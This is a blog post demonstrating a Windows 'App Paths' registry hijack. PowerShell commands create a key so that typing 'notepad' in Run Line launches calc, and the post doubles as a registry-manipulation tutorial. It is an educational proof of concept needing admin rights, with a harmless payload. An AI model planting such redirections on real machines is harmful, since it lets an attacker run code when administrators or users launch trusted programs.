---
title: "Silly Attack Using Run Line"
date: 2017-10-26T21:11:55-04:00
draft: false
toc: false
comments: true
categories:
- Windows
tags:
- Run Line

---

[Previously]({{< ref "2017-10-23-windows-run-line-vs-cmd.markdown" >}} "Run Line vs. cmd vs. PowerShell") we saw how Windows Run Line searches in `App Paths` registry keys before PATH. We can perform a silly attack and create a registry key for an application in path and point it to another command.

This is a silly attack because we need to be admin to create/edit those keys. But if you ever find yourself in the unlikely situation, you can use this to become delayed admin (i.e. wait for admin to run the app via Run Line).

<!--more-->

This also serves as a ~~tutorial~~ note for using PowerShell to list/manipulate registry.

Let"s pick `notepad` which is in PATH and point it to `calc`. Open an admin PowerShell prompt.

First check if key exists (note we have tab auto-complete inside registry):

``` powershell
# notepad does not have an entry
$ Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\notepad.exe"
False
# chrome does
$ Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
True
```

Now create the key and set the default property:

``` powershell
$ New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths"
        -Name notepad.exe -Value "C:\Windows\System32\calc.exe"

    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths

SKC  VC Name                           Property
---  -- ----                           --------
  0   1 notepad.exe                    {(default)}

```

We could have set the default value later using `Set-Item`:

``` powershell
$ Set-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\notepad.exe"
           -Value "C:\Windows\System32\calc.exe"
```

To create new properties use `New-ItemProperty`. For example the property `Path` contains the working directory:

``` powershell
$ New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\notepad.exe" 
                   -Name Path -Value "C:\Windows\System32\"

PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft
               \Windows\CurrentVersion\App Paths\notepad.exe
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft
               \Windows\CurrentVersion\App Paths
PSChildName  : notepad.exe
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
Path         : C:\Windows\System32\
```

`ls/gci/Get-ChildItem` do not list the properties, only registry keys.

``` powershell
$ ls -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\"
    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths

SKC  VC Name                           Property
---  -- ----                           --------
  0   2 chrome.exe                     {(default), Path}
  0   2 notepad.exe                    {(default), Path}

$ ls -path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\notepad.exe"
```

We need to get each property one by one (or use a PS script to run `$Key.GetValueNames()` and iterate over them).

Now open up Run Line and enter `notepad` to see `calc` pop up.

Silly attack because only admins can edit those registry keys.
